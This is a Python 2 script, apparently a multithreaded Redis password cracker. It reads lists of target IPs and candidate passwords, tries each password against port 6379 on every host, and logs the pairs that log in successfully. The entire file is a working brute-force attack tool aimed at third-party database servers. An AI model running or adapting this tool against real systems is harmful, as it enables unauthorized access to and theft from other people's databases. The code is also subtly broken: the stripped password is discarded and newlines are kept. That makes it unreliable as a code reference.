#!python
#-*- coding:utf8 -*-
# author			: glacier@insight-labs.org
# version			: v1.0

import redis
import os
import Queue
import threading

dicpath ='pass.dic'
ipfile ='s.txt'
exitFlag = 0
wr = open("./result.txt",'w')

class CrackRedisThread(threading.Thread):
    def __init__(self,threadid, q):
        threading.Thread.__init__(self)
        self.tid = threadid
        #self.name = name
        self.q = q
    def run(self):
        print "Starting " + str(self.tid) + "thread"
        CrackRedis(self.q)
        print "Exiting " + str(self.tid) + "thread"


def CrackRedis(ip):
	#print(ip.get())
	while not exitFlag:

		#print(workQueue)
		if not workQueue.empty():
			#print(ip.get())
			queueLock.acquire()
			server_addr = ip.get()
			queueLock.release()
			#print(server_addr)
			#queueLock.acquire()
			#print(server_addr)
			with open(dicpath) as f:
				#print("111111")
				for line in f:
					pw = line.strip()
					pw.replace('\n','')
					pw.replace('\r','')
					pw = line
					if(pw=='NULL'):
						pw = ''
					#q.put(pw)
					print(server_addr + ":" + pw)
					try:
						r = redis.Redis(host=server_addr, port=6379, db=0,password=pw,socket_timeout=3)
						db_size=r.dbsize()
						#print(db_size)
						print(server_addr + pw + " sucessful")
						wr.write(server_addr + pw + " sucessful\n")
						break
					except redis.exceptions.ResponseError:
						print pw + " fail"
						pass
					except :
						pass
					#r.close()
			f.close()
			ip.task_done()
		#else:
		#	break
			#queueLock.release()
	        #print "%s processing %s" % (threadName, data)
	        #time.sleep(1)

'''
def CrackRedis2(ip):

	with open(dicpath) as f:
		for line in f:
			#pw = line.strip()
			pw = line
			#q.put(pw)
			#print(pw)
			try:
				r = redis.Redis(host=ip, port=6379, db=0,password=pw,socket_timeout=10)
				db_size=r.dbsize()
				#print(db_size)
				print(pw)
				#print("sucessful")
				break
			except redis.exceptions.ResponseError:
				print "fail"
				#pass
		f.close()

'''

#CrackRedis2('127.0.0.1')

queueLock = threading.Lock()
workQueue = Queue.Queue(10)
threads = []
tid = 0
# 创建新线程
for i in range(50):
    thread = CrackRedisThread(tid,workQueue)
    thread.start()
    threads.append(thread)
    tid = tid + 1


# 填充队列
#queueLock.acquire()
with open(ipfile) as ips:
	for ip in ips:
		#print ip
		workQueue.put(ip)
#queueLock.release()

# 等待队列清空
while not workQueue.empty():
    pass

# 通知线程是时候退出
exitFlag = 1

# 等待所有线程完成
for t in threads:
    t.join()

wr.close()
print "Exiting Main Thread"